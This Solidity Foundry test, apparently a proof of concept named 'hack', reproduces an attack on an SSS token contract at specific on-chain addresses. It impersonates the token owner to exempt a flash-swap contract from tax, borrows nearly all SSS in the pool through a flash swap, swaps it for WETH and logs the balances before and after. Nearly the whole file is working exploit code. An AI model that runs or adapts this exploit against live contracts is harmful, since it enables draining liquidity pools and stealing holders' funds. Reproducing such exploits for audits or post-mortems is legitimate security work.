// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;
import {Test} from "forge-std/Test.sol";
import {SSS} from "./../src/SSS.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {flashSwap} from "./FlashSwap.sol";

contract hack is Test {
    IERC20 public SSS_token;
    address hacker = makeAddr("hacker");
    flashSwap public flash;
    IERC20 public Weth;
    address public owner_of_SSS;

    function setUp() public {
        SSS_token = IERC20(0xdfDCdbC789b56F99B0d0692d14DBC61906D9Deed);
        Weth = IERC20(0x4300000000000000000000000000000000000004);
        owner_of_SSS = 0x81957859126df74C2d61760d205F4960D95aC735;
        flash = new flashSwap();
    }

    function test_Hack_SSS() public {
        vm.startPrank(owner_of_SSS);
        SSS(payable(address(SSS_token))).setExcludeFromTax(
            address(flash),
            true
        );
        vm.stopPrank();

        console.log(
            "balance of SSS_Token before taking Hacking ::",
            SSS_token.balanceOf(address(flash)),
            " SSS_token"
        );
        uint256 SSS_token_amount = uint256(
            flash.getTotalAmountOfSssTokenInPool(
                address(Weth),
                address(SSS_token)
            )
        );
        flash.FlashSwap(
            address(Weth),
            address(SSS_token),
            SSS_token_amount - 1
        );
        console.log(
            "balance of SSS_Token After taking Hacking ::",
            SSS_token.balanceOf(address(flash)) / (10 ** 18),
            " SSS_token"
        );

        console.log(
            "balance of Weth before Swapping :: ",
            Weth.balanceOf(address(flash)),
            " Weth"
        );
        flash.swappingSSStokenForWeth(
            address(Weth),
            address(SSS_token),
            IERC20(SSS_token).balanceOf(address(flash))
        );
        console.log(
            "balance of Weth After Swapping :: ",
            Weth.balanceOf(address(flash)) / (10 ** 18),
            " Weth"
        );
    }
}
